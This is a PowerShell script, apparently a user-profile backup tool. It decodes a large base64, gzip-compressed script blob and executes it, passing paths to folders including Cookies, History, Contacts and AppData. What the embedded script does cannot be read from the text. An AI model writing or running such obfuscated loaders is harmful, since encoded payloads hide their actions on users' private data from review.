Param(
    $Personal,
    $Desktop,
    $Favorites,
    $MyMusic,
    $MyPic,
    $MyVideo,
    $Downloads,
    $SavedGames,
    $Contacts,
    $Searches,
    $Links,
    $Cookies,
    $Cache,
    $History,
    $Recent,
    $TempFile,
    $AppData,
    $FileAppend);
$ZipCode = @"
using System;
using System.IO;
using System.IO.Compression;
using System.Text;


    public class ZipCode
    {
        public  ZipCode()
        {

        }


        public string Zip(string text)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(text);
            MemoryStream memoryStream = new MemoryStream();
            using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
            {
                gZipStream.Write(buffer, 0, buffer.Length);
            }

            memoryStream.Position = 0;

            byte[] compressedData = new byte[memoryStream.Length];
            memoryStream.Read(compressedData, 0, compressedData.Length);

            byte[] gZipBuffer = new byte[compressedData.Length + 4];
            Buffer.BlockCopy(compressedData, 0, gZipBuffer, 4, compressedData.Length);
            Buffer.BlockCopy(BitConverter.GetBytes(buffer.Length), 0, gZipBuffer, 0, 4);

            return Convert.ToBase64String(gZipBuffer);       
         }

        public string Unzip(string compressedText)
        {
            byte[] gZipBuffer = Convert.FromBase64String(compressedText);
            using (MemoryStream memoryStream = new MemoryStream())
            {
                int dataLength = BitConverter.ToInt32(gZipBuffer, 0);
                memoryStream.Write(gZipBuffer, 4, gZipBuffer.Length - 4);

                byte[] buffer = new byte[dataLength];

                memoryStream.Position = 0;
                using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
                {
                    gZipStream.Read(buffer, 0, buffer.Length);
                }

                return Encoding.UTF8.GetString(buffer);
            }
        }
    }
"@;

Add-Type -TypeDefinition $ZipCode;

$envbackupzipps="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";
$zipinst = New-Object -TypeName ZipCode;
$envbackps = $zipinst.Unzip($envbackupzipps);

$scriptblock =  [scriptblock]::Create($envbackps);
Invoke-Command -ScriptBlock $scriptblock  -ArgumentList      $Personal,$Desktop,$Favorites,$MyMusic,$MyPic,$MyVideo,$Downloads,$SavedGames,$Contacts,$Searches,$Links,$Cookies,$Cache,$History,$Recent,$TempFile,$AppData,$FileAppend;


